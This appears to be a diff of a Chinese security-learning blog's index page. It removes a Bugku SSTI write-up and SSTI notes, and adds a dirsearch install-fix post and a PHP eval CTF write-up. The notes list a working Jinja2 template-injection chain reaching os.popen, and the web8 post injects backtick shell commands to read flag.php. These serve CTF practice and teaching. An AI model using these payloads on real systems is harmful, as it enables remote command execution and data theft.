@@ -164,223 +164,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-bugku-web-Simple-SSTI-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/bugku-web-Simple-SSTI-1/">bugku-web-Simple_SSTI_1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/30/bugku-web-Simple-SSTI-1/" class="archive-article-date">
-  	<time datetime="2021-07-30T02:11:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>首先建议先看一下关于ssti的基础知识——</p>
-<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" title="ssti笔记">ssti笔记</a>
-<p>（虽然对这道题没什么用）</p>
-<h2 id="开始做题——"><a href="#开始做题——" class="headerlink" title="开始做题——"></a>开始做题——</h2><h2 id="打开题目后只有一行字"><a href="#打开题目后只有一行字" class="headerlink" title="打开题目后只有一行字"></a>打开题目后只有一行字</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/1.PNG" class="" title="1.PNG">
-<hr>
-<h2 id="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"><a href="#意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显" class="headerlink" title="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"></a>意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/2.PNG" class="" title="2.PNG">
-
-<hr>
-<h2 id="然后测试是否存在ssti注入，发现有注入"><a href="#然后测试是否存在ssti注入，发现有注入" class="headerlink" title="然后测试是否存在ssti注入，发现有注入"></a>然后测试是否存在ssti注入，发现有注入</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/3.PNG" class="" title="3.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/4.PNG" class="" title="4.PNG">
-
-<hr>
-<h2 id="打开页面源代码，发现下方有注释"><a href="#打开页面源代码，发现下方有注释" class="headerlink" title="打开页面源代码，发现下方有注释"></a>打开页面源代码，发现下方有注释</h2><p>意思好像是让我们找secret_key<br>学习flask后发现，这个secret_key是flask的一个系统参数</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/20.PNG" class="" title="20.PNG">
-
-<hr>
-<h2 id="扫了一下目录，发现一个-console"><a href="#扫了一下目录，发现一个-console" class="headerlink" title="扫了一下目录，发现一个/console"></a>扫了一下目录，发现一个/console</h2><p>打开后发现让我们输pin码，然后就可以使用shell指令，这里可以用笔记中的方法获取主机名，配合cookie构造，不过这里不需要shell，所以没有用</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/18.PNG" class="" title="18.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/19.PNG" class="" title="19.PNG">
-
-<hr>
-<h2 id="直接用系统指令config-secret-key查secret-key，得出flag"><a href="#直接用系统指令config-secret-key查secret-key，得出flag" class="headerlink" title="直接用系统指令config.secret_key查secret_key，得出flag"></a>直接用系统指令config.secret_key查secret_key，得出flag</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/17.PNG" class="" title="17.PNG">
-
-
-
-<p>下面我也根据笔记进行了测试——</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/5.PNG" class="" title="5.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/6.PNG" class="" title="6.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/7.PNG" class="" title="7.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/8.PNG" class="" title="8.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/9.PNG" class="" title="9.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/10.PNG" class="" title="10.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/11.PNG" class="" title="11.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/12.PNG" class="" title="12.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/13.PNG" class="" title="13.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/14.PNG" class="" title="14.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/15.PNG" class="" title="15.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/16.PNG" class="" title="16.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/21.PNG" class="" title="21.PNG">
-
-
-<p>报错界面（也可以用于输入pin后运行shell，或者查看部分源代码）（方法：随便输错点什么）</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/22.PNG" class="" title="22.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/bugku-web-Simple-SSTI-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-ssti笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">ssti笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2021-07-30T02:03:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>推荐视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1zi4y1x7QM">https://www.bilibili.com/video/BV1zi4y1x7QM</a><br>（星盟战队，h3h3da大佬，yyds!!)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in range(10)%&#125;</span><br><span class="line">&#123;%print(i)%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">（查popen,os,sys）</span><br><span class="line">popen:&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302]&#125;&#125;</span><br><span class="line">(替换302到别的数直到找到popen（）的数值）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__.__globals__&#125;&#125;</span><br><span class="line">测popen，os</span><br><span class="line"></span><br><span class="line">若有os:&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br><span class="line">(ls可以换成各种shell）</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line">(得到主机名，用于构造pin）</span><br><span class="line">http:&#x2F;&#x2F;114.67.246.176:11940&#x2F;?flag&#x3D;&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[%22os%22].popen(%22cat%20flag%22).read()&#125;&#125;</span><br><span class="line">（直接搜flag）</span><br><span class="line"></span><br></pre></td></tr></table></figure></span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
     <article id="post-sql注入笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1196,6 +979,228 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/05/11/WICCTF2021-%E6%B4%A5%E9%97%A8%E6%9D%AF-web-hate-php/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-dirsearch踩坑以及python-出现“Traceback-most-recent-call-last-……”错误的解决方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">dirsearch踩坑以及python 出现“Traceback (most recent call last):……”错误的解决方法</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2021-05-11T11:44:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="dirsearch踩坑以及python-出现“Traceback-most-recent-call-last-……”错误的解决方法"><a href="#dirsearch踩坑以及python-出现“Traceback-most-recent-call-last-……”错误的解决方法" class="headerlink" title="dirsearch踩坑以及python-出现“Traceback-most-recent-call-last-……”错误的解决方法"></a>dirsearch踩坑以及python-出现“Traceback-most-recent-call-last-……”错误的解决方法</h2><p>因为一些原因，我尝试在windows上安装dirsearch<br>网上的安装教程全都是一毛一样的，不知道是谁复制谁的。</p>
+<p>总的来说就是先从<br><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>上下载zip，解压<br>或者直接git clone <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
+<p>仅说了需要python3的环境<br>然后cd到dirsearch-master，输入python dirsearch.py -u &lt;网址&gt;<br>就行了，像这样</p>
+
+
+<p>而我的实际操作中，是这样的——</p>
+<img src="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/2.PNG" class="" title="2.PNG">
+
+<p>会报错“Traceback (most recent call last):……”</p>
+<p>然后我在网上找了好久，终于找到了一篇不一样的博客（CSDN是该管管了，垃圾指针无限递归问题）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29163073/article/details/112795375?utm_medium=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.wap_blog_relevant_pic&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.wap_blog_relevant_pic">https://blog.csdn.net/qq_29163073/article/details/112795375?utm_medium=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.wap_blog_relevant_pic&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.wap_blog_relevant_pic</a></p>
+<p>这个博客说需要用pip安装一些帮助文件</p>
+<p>然后我又搜到了这个————<br><a target="_blank" rel="noopener" href="https://pip-cn.readthedocs.io/en/latest/installing.html">https://pip-cn.readthedocs.io/en/latest/installing.html</a><br>结论：Python 2.5在 v1.3.1版本后, Python 2.4在v1.1版本后，安装python后会自动安装pip<br>所以pip本身的安装不用管了</p>
+<p>在尝试了pip install chardet &amp; pip install certifi后，发现还是和原来一样的报错</p>
+<p>然后搜到了这个——<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43978056/article/details/105940157">https://blog.csdn.net/weixin_43978056/article/details/105940157</a></p>
+<p>再回去看报错，发现缺少的是“urllib3”</p>
+<img src="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/6.PNG" class="" title="6.PNG">
+<p>直接pip install urllib3</p>
+<img src="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/3.PNG" class="" title="3.PNG">
+
+<p>再尝试，发现这次缺的是cryptography</p>
+<img src="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/4.PNG" class="" title="4.PNG">
+<p>继续pip install cryptography</p>
+<p>再尝试，才成功开始扫目录</p>
+<img src="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/5.PNG" class="" title="5.PNG">
+
+<p>所以以后遇到“Traceback (most recent call last):……”的问题，都可以尝试这样解决</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-bugku-web-web8" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/26/bugku-web-web8/">bugku_web_web8</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/04/26/bugku-web-web8/" class="archive-article-date">
+  	<time datetime="2021-04-26T12:51:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>打开以后又是php代码</p>
+<img src="/2021/04/26/bugku-web-web8/web8.1.PNG" class="8.1.PNG">
+<img src="/2021/04/26/bugku-web-web8/web8.2.PNG" class="8.2.PNG">
+<p>解读一下：<br>包含flag.php文件<br>读入一个参数为hello的数据（REQUEST相当于get+post）<br>eval( “var_dump($a);”);————检测是否为php语句，若是则执行<br>show_source(__FILE__);————整个文件“高亮显示”（__FILE__是“整个文件”的意思，至于“高亮显示”，我的理解是把代码按照一定颜色规则排布在页面上）</p>
+<p>所以这道题涉及到了php语句的问题，那方法就会很多了</p>
+<p>我首先想到的是用shell（盲猜是linux系统）</p>
+<p>直接hello= `cat flag.php`(两边是用的“反引号”（键盘左上角那个），相当于把里面的内容当shell使用，自从有一次被限制字数后，就再也不用system（）了)</p>
+<p>虽然显示有103个字符，但是没法输出。</p>
+<img src="/2021/04/26/bugku-web-web8/web8.3.PNG" class="8.3.PNG">
+
+<p>然后用hello= `tac flag.php`，却能输出flag（相当于cat的“反序输出”，但只是“行之间反序”）</p>
+<img src="/2021/04/26/bugku-web-web8/web8.4.PNG" class="8.4.PNG">
+
+
+<p>为什么用tac而不是cat：因为那个php文件带有<?php和后面的?>，正序输出会被网页当做php代码运行（结果为空），但是<?php 和?>不在同一行，所以tac反序输出使其不闭合，才可以显示其字符串的形式</p>
+<p>这样就得到了flag</p>
+<p>当然还有一种注入的方法，通过闭合前面以及注释掉后面来输出flag</p>
+<img src="/2021/04/26/bugku-web-web8/web8.5.PNG" class="8.5.PNG">
+
+<p>当然还有一种思路是用?hello=get_file_contents(‘flag.php’)或者?hello=file(‘flag.php)，直接把文件内容写入hello，然后输出，但是这种方法被封了（似乎是权限给的不够，当然，如果权限够的话，甚至可以用cp指令，然后读文件，但是尝试后发现返回null说明不行）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/26/bugku-web-web8/">展开全文 >></a>
         </p>
       
 
